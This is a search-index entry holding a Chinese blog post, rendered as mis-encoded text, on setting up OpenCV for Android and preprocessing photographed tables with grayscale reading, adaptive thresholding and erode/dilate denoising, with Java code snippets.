    <content type="text"><![CDATA[çŽ¯å¢ƒé…ç½®https://www.learn2crack.com/2016/03/setup-opencv-sdk-android-studio.html éžå¸¸æ–°çš„ä¸€ç¯‡åœ¨ASä¸­å®‰è£…OpenCVçš„æ•™ç¨‹ï¼ŒæŒ‰æ•™ç¨‹è£…å¥½äº†çŽ¯å¢ƒå¹¶æµ‹è¯•é€šè¿‡ã€‚ æ³¨æ„æ•™ç¨‹ä¸­æ²¡æœ‰è®²åˆ°çš„æ˜¯æƒ³è¦ä½¿ç”¨OpenCVçš„ç›¸å…³åŠŸèƒ½ï¼Œéœ€è¦å®‰è£…ä¸‹è½½åŒ…ä¸­apkç›®å½•ä¸‹çš„å¯¹åº”å¤„ç†å™¨çš„OpenCV managerã€‚å¹¶åœ¨ä½¿ç”¨OpenCVçš„æ´»åŠ¨ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š1234567891011121314151617private BaseLoaderCallback mLoaderCallback = new BaseLoaderCallback(this) &#123; //Connect to OpenCV manager service and initialize @Override public void onManagerConnected(int status) &#123; switch (status)&#123; case BaseLoaderCallback.SUCCESS: Log.i(TAG, "OpenCV Success"); break; default: super.onManagerConnected(status); Log.i(TAG, "OpenCV Fail"); break; &#125; &#125;&#125;; 1234567//Initialize at every resume@Overrideprotected void onResume() &#123; super.onResume(); OpenCVLoader.initAsync(OpenCVLoader.OPENCV_VERSION_3_1_0, getApplicationContext(), mLoaderCallback); Log.d(TAG, "On Resume OK");&#125; http://docs.opencv.org/java/3.1.0/&gt;opencvçš„å®˜æ–¹æ–‡æ¡£ã€‚æ›´æ­£ï¼šä¸Šé¢çš„3.1ç‰ˆçš„æ–‡æ¡£å¹¶æ²¡æœ‰è¯¦ç»†çš„æ–¹æ³•è§£é‡Šï¼ æ‰€ä»¥åªèƒ½çœ‹ http://docs.opencv.org/java/2.4.11/ 2.4.11çš„ã€‚ å¤„ç†çš„å¤§è‡´æ€è·¯ç›®å‰æƒ³åˆ°çš„æ€è·¯æ˜¯ï¼š å›¾åƒå½©è‰²è½¬ç°åº¦ ç°åº¦å›¾åƒè®¾ç½®é˜ˆå€¼åŽäºŒå€¼åŒ–å³å˜æˆå®Œå…¨é»‘ç™½ åŽ»é™¤å¤šä½™çš„å™ªç‚¹ è¾¹ç¼˜è¯†åˆ« é€è§†å˜å½¢ çŸ©å½¢è¯†åˆ« åˆ†å‰²è¯†åˆ«å‡ºçš„çŸ©å½¢ OCRå¯¹çŸ©å½¢è¿›è¡Œè¯†åˆ«ï¼Œè¯»å–æ•°æ®ã€‚ å®žçŽ°ç°åº¦ä¸ŽäºŒå€¼åŒ–å¼€å§‹é‡‡ç”¨OpenCVä¸­BitmapToMatæ–¹æ³•ï¼Œå°†æ–‡ä»¶ä»¥Bitmapçš„å½¢å¼è¯»å–ï¼Œå†è½¬æ¢ä¸ºMatæ ¼å¼å†è¿›è¡Œå¤„ç†ã€‚ åŽé¢å‘çŽ°äº†OpenCVè‡ªå¸¦çš„imreadæ–¹æ³•ï¼Œä¼ å…¥æ–‡ä»¶è·¯å¾„å’ŒMatçš„æ ¼å¼åŽå°±å¯ä»¥æ–¹ä¾¿åœ°èŽ·å¾—ä¸€ä¸ªMatå¯¹è±¡ã€‚ å¦å¤–å¦‚æžœåœ¨è¿™é‡Œé‡‡ç”¨Imgcodecs.CV_LOAD_IMAGE_GRAYSCALEæ ‡ç­¾ï¼Œå°±å¯ä»¥ç›´æŽ¥ä»¥ç°åº¦çš„å½¢å¼è¯»å–å›¾åƒï¼ŒçœåŽ»äº†é¢œè‰²è½¬åŒ–çš„æ­¥éª¤ã€‚å¹¶ä¸”è¿™ä¸ªMatçš„æ ¼å¼å°±æ˜¯ä¸‹é¢ä¸€æ­¥äºŒå€¼åŒ–è¦æ±‚ä¼ å…¥çš„8UC1ï¼ˆ8ä½å•é€šé“ï¼‰æ ¼å¼ã€‚ ä¸‹é¢å°±æ˜¯äºŒå€¼åŒ–æ­¥éª¤ï¼ŒOpenCVæä¾›äº†ä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ™®é€šçš„Thresholdå‡½æ•°ï¼š thresholdpublic static double threshold(Mat src,Mat dst,double thresh,double maxval,int type) Parameters: src - input array (single-channel, 8-bit or 32-bit floating point). dst - output array of the same size and type as src. thresh - threshold value. maxval - maximum value to use with the THRESH_BINARY and THRESH_BINARY_INV thresholding types. type - thresholding type (see the details below). ä¼ å…¥å›¾åƒï¼Œä¼ å‡ºå›¾åƒï¼Œé˜ˆå€¼ï¼Œå¡«å……çš„æœ€æ·±é¢œè‰²ï¼Œå¡«å……æ–¹æ³•ï¼ˆè¾¾åˆ°é˜ˆå€¼å°±å¡«å……æœ€æ·±é¢œè‰²æˆ–ç›¸åï¼‰ï¼Œå°±å¯ä»¥æ ¹æ®æ¯ä¸ªåƒç´ çš„ç°åº¦å€¼ä¸Žé˜ˆå€¼è¿›è¡Œæ¯”è¾ƒæ¥å†³å®šå¡«å……çš„å€¼ä¸º0æˆ–æ˜¯æœ€æ·±ã€‚ å®šé˜ˆå€¼çš„æ–¹æ³•è™½ç„¶å¯ä»¥å¯¹ä¸€å¼ å›¾åƒé€šè¿‡è°ƒæ•´è¾¾åˆ°æœ€ä¼˜çš„æ•ˆæžœï¼Œä½†æ˜¯å¯¹äºŽä¸åŒå…‰ç…§æ¡ä»¶ä¸‹æ‹æ‘„å‡ºæ¥çš„ç…§ç‰‡ï¼Œå› ä¸ºæ•´ä½“äº®åº¦çš„ä¸åŒï¼Œå®šé˜ˆå€¼æ˜¾ç„¶æ— æ³•é€‚åº”æ‰€æœ‰çš„æƒ…å†µã€‚ æ‰€ä»¥å°±æœ‰äº†ç¬¬äºŒç§å‡½æ•°ï¼ŒadaptiveThresholdï¼Œé™¤äº†ä¼ å…¥ä¸Šé¢çš„è¿™äº›å‚æ•°å¤–ï¼Œå¢žåŠ äº†ä¸‰ä¸ªé‡è¦çš„å‚æ•° adaptiveThresholdpublic static void adaptiveThreshold(Mat src,Mat dst,double maxValue,int adaptiveMethod,int thresholdType,int blockSize,double C)Parameters:src - Source 8-bit single-channel image.dst - Destination image of the same size and the same type as src.maxValue - Non-zero value assigned to the pixels for which the condition is satisfied. See the details below.adaptiveMethod - Adaptive thresholding algorithm to use, ADAPTIVE_THRESH_MEAN_C or ADAPTIVE_THRESH_GAUSSIAN_C. See the details below.thresholdType - Thresholding type that must be either THRESH_BINARY or THRESH_BINARY_INV.blockSize - Size of a pixel neighborhood that is used to calculate a threshold value for the pixel: 3, 5, 7, and so on.C - Constant subtracted from the mean or weighted mean (see the details below). Normally, it is positive but may be zero or negative as well. blockSizeï¼šå¯¹æŸä¸ªåƒç´ å‘¨å›´è¿›è¡Œé‡‡æ ·çš„èŒƒå›´ã€‚adaptiveMethodï¼šæ ¹æ®ä¸Šé¢çš„èŒƒå›´æ±‚é˜ˆå€¼çš„æ–¹æ³•ï¼Œæœ‰ä¸¤ç§ï¼š meanå¹³å‡ï¼Œç®€å•åœ°å–é‡‡æ ·èŒƒå›´å†…çš„å¹³å‡å€¼ä½œä¸ºé˜ˆå€¼ã€‚ gaussiané«˜æ–¯ï¼Œä»¥é«˜æ–¯å‡½æ•°ä¸ºåŸºç¡€ï¼Œç®€å•åœ°è¯´å°±æ˜¯è¿‘çš„åœ°æ–¹æƒé‡æ›´é«˜ã€è¿œçš„åœ°æ–¹æƒé‡ä½Žï¼Œæ¥æ±‚é˜ˆå€¼ã€‚ Cï¼šæ±‚å‡ºæ¥çš„é˜ˆå€¼å‡åŽ»çš„å¸¸é‡ã€‚ è¿™ä¸‰ä¸ªå‚æ•°å°±æ˜¯å†³å®šäºŒå€¼åŒ–æ•ˆæžœçš„å…³é”®ï¼Œæˆ‘æ‰¾æœ€ä¼˜å€¼çš„æ–¹æ³•æ¯”è¾ƒæš´åŠ›ï¼Œå†™äº†ä¸€ä¸ªåµŒå¥—çš„å¾ªçŽ¯è®¾ç½®è¿™ä¸¤ä¸ªå€¼ï¼Œå†è¾“å‡ºåˆ°æ–‡ä»¶å¯¼å‡ºåˆ°ç”µè„‘ä¸Šç”¨è‚‰çœ¼æ¯”è¾ƒã€‚æœ€åŽç¡®å®šçš„å€¼ä¸º17-10ã€‚ adaptiveMethodæˆ‘ç”¨çš„æ˜¯meanï¼Œå› ä¸ºè¡¨æ ¼ç›¸å¯¹æ¥è¯´é»‘ç™½æ¯”è¾ƒæ˜Žæ˜¾ï¼Œå¹¶ä¸éœ€è¦åŽ»æ ¹æ®è·ç¦»çš„è¿œè¿‘æ¥å†³å®šé˜ˆå€¼ã€‚ 17è¿™ä¸ªå€¼åœ¨æˆ‘çš„æ‰‹æœºæ‹æ‘„å‡ºæ¥çš„æ•ˆæžœé‡Œé¢æ˜¯æœ€å¥½çš„ï¼Œä½†ç”±äºŽä¸åŒæ‹æ‘„è®¾å¤‡çš„åˆ†è¾¨çŽ‡ä¸åŒï¼Œå°±é€ æˆäº†ç¬”ç”»æ‰€å æ®çš„åƒç´ çš„æ•°é‡çš„ä¸åŒï¼Œå¯ä»¥æƒ³åˆ°çš„æ˜¯åœ¨é«˜åˆ†è¾¨çŽ‡çš„æƒ…å†µä¸‹è¿™ä¸ªå€¼åº”è¯¥è¦ç›¸åº”åœ°å¢žå¤§ï¼Œæ‰“ä¸ªæ¯”æ–¹è¯´æˆ‘ä¸€ä¸ªç¬”ç”»çš„ç²—ç»†å°±æœ‰17ä¸ªåƒç´ ï¼Œé‚£ä¹ˆè¿™ä¸ªèŒƒå›´å†…æ£€æµ‹å‡ºçš„é˜ˆå€¼å°±ä¼šéžå¸¸é«˜ä»Žè€Œå¯¼è‡´ç¬”ç”»çš„æ®‹ç¼ºä¸å…¨ã€‚ Cè¿™ä¸ªå€¼è¿˜æ˜¯éœ€è¦ç»è¿‡æµ‹è¯•æ¥å¾—å‡ºçš„ï¼Œè®¾ç½®çš„ä¸åŒå¯¹æœ€åŽæ•ˆæžœçš„å½±å“æ˜¯æœ€å¤§çš„ï¼Œç›´æŽ¥ä¼šå†³å®šæœ€åŽå‡ºæ¥çš„å›¾ç‰‡æ˜¯ç¬”ç”»è¿‡ç²—æˆ–æ˜¯ç¬”ç”»æ®‹ç¼ºã€‚ ä¸‹é¢æ˜¯å¤„ç†å‰åŽçš„æ•ˆæžœï¼š å¯ä»¥çœ‹åˆ°äºŒå€¼åŒ–ä»¥åŽçš„å›¾åƒåªæœ‰é»‘ç™½ä¸¤è‰²ï¼Œä½†æ˜¯æ˜Žæ˜¾æœ‰è®¸å¤šçš„å™ªç‚¹ã€‚ åŽ»å™ªäºŒå€¼åŒ–ä¹‹åŽå°±æ˜¯åŽ»å™ªäº†ï¼ŒåŽ»å™ªçš„ç›®çš„æ˜¯æŠŠå›¾åƒä¸­çš„ç‹¬ç«‹çš„ç‚¹åŽ»æŽ‰ã€‚ åŽ»å™ªçš„æ–¹æ³•æ˜¯è…èš€ï¼Œè·Ÿå­—é¢æ„æ€ä¸€æ ·ï¼Œå°±æ˜¯ç¼©å°å›¾æ¡ˆçš„èŒƒå›´ï¼Œå½“å›¾åƒçš„èŒƒå›´æœ¬èº«å°±å¾ˆå°æ—¶ï¼ˆå™ªç‚¹å°±æ˜¯ä¸€ä¸ªä¸ªè¿™æ ·çš„ç‹¬ç«‹ç‚¹ï¼‰ï¼Œç¼©å°åŽè‡ªç„¶å°±ä¸è§äº†ã€‚ å¯ä»¥æƒ³åˆ°ï¼Œåœ¨åŽ»å™ªåŽï¼Œéƒ¨åˆ†ç¬”ç”»ä¹Ÿéšä¹‹ç¼©å°ç”šè‡³ç»†çš„åœ°æ–¹ä¼šç›´æŽ¥æ¶ˆå¤±ï¼Œæ‰€ä»¥è…èš€ä¹‹åŽè¦å†è¿›è¡Œä¸€æ­¥è†¨èƒ€ï¼Œå³æŠŠå›¾æ¡ˆçš„è¾¹ç¼˜æ‰©å¤§ã€‚ å› ä¸ºå™ªç‚¹å·²ç»æ¶ˆå¤±ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šå› æ‰©å¤§è€Œå›žæ¥ï¼Œä½†ç¬”ç”»ä¾ç„¶å­˜åœ¨ï¼Œå°±ä¼šè†¨èƒ€è€Œå¾—åˆ°å¼¥è¡¥ï¼Œä¹Ÿé¡ºä¾¿å¯ä»¥è¡¥ä¸€ä¸‹æ®‹ç¼ºçš„åœ°æ–¹ã€‚ åŽŸç†å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ç”±äºŽOpenCVçš„è¿™ä¸¤ä¸ªæ“ä½œé’ˆå¯¹çš„æ˜¯å›¾åƒä¸­çš„äº®ç‚¹ï¼ˆç™½è‰²çš„åœ°æ–¹è¢«è®¤ä¸ºæ˜¯äº®ç‚¹ï¼‰ï¼Œè€Œæˆ‘ä»¬çš„è¡¨æ ¼åˆæ˜¯ç™½åº•é»‘å­—çš„ï¼Œå®žé™…ä¸Šé»‘è‰²çš„éƒ¨åˆ†æ˜¯æˆ‘ä»¬æƒ³è¦å¤„ç†çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘å°†è¿™ä¸¤æ­¥äº¤æ¢äº†ï¼Œç›¸å½“äºŽæ˜¯å¯¹é»‘è‰²çš„åœ°æ–¹å…ˆè…èš€åŽè†¨èƒ€ã€‚ ä¸‹é¢æ˜¯ä»£ç å®žçŽ°ï¼š123456Mat kernelDilate = Imgproc.getStructuringElement(Imgproc.MORPH_DILATE, new Size(2, 2));Imgproc.dilate(srcPic, srcPic, kernelDilate);Imgcodecs.imwrite("/storage/sdcard/pic/test/afterErode.jpg", srcPic);Mat kernelErode = Imgproc.getStructuringElement(Imgproc.MORPH_ERODE, new Size(2, 2));Imgproc.erode(srcPic, srcPic, kernelErode);Imgcodecs.imwrite("/storage/sdcard/pic/test/afterDilate.jpg", srcPic); å‚æ•°ä¸­æœ‰ä¸€ä¸ªKernelï¼Œè¿™ä¸ªå°±æ˜¯å¤„ç†å›¾åƒçš„æ ¸ï¼Œå…·ä½“çš„å†…å®¹ä¸å±•å¼€ï¼Œæˆ‘ä»¬åˆ©ç”¨getStructuringElementå‡½æ•°å¯ä»¥æž„å»ºç‰¹å®šçš„å¤„ç†æ ¸ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æž„å»ºçš„æ ¸çš„ç±»åž‹ï¼Œé™¤äº†ç”¨äºŽä»£ç ä¸­ç”¨åˆ°çš„è†¨èƒ€å’Œè…èš€çš„ç±»åž‹ï¼Œè¿˜æœ‰ractã€crossã€ellipseç­‰ä¸åŒçš„å½¢çŠ¶ï¼ŒåŽé¢çš„sizeå°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„é‡ç‚¹äº†ï¼ŒæŒ‡çš„æ˜¯æ ¸çš„å¤§å°ï¼Œå¯ä»¥ç†è§£æˆæ£€æµ‹çš„èŒƒå›´ï¼Œå¯¹äºŽå¤§çš„å™ªç‚¹è‡ªç„¶éœ€è¦å¤§çš„èŒƒå›´ï¼Œä½†æ˜¯ä¹Ÿæ„å‘³ç€ç¬”ç”»ç»†èŠ‚ä¸¢å¤±ä¹Ÿæ›´åŠ ä¸¥é‡ã€‚å¯¹äºŽè†¨èƒ€æ“ä½œï¼Œåˆ™å¯ä»¥ç†è§£æˆè†¨èƒ€çš„åƒç´ æ•°ï¼Œè¿™ä¸ªæ•°å€¼è¶Šå¤§ï¼Œæœ€åŽçš„ç»“æžœä¸­çš„ç¬”ç”»ä¹Ÿå°±è¶Šç²—ã€‚ ä¸‹é¢æ˜¯ä¸Šè¿°ä»£ç çš„ç»“æžœå¯¹æ¯”ï¼š ä¹‹å‰ è®¾ç½®äº†å››ç§ä¸åŒçš„å‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°å™ªç‚¹åŸºæœ¬éƒ½è¢«åŽ»é™¤ï¼Œæœ€åŽçš„ç»†èŠ‚ä¸å°½ç›¸åŒã€‚]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
</search>
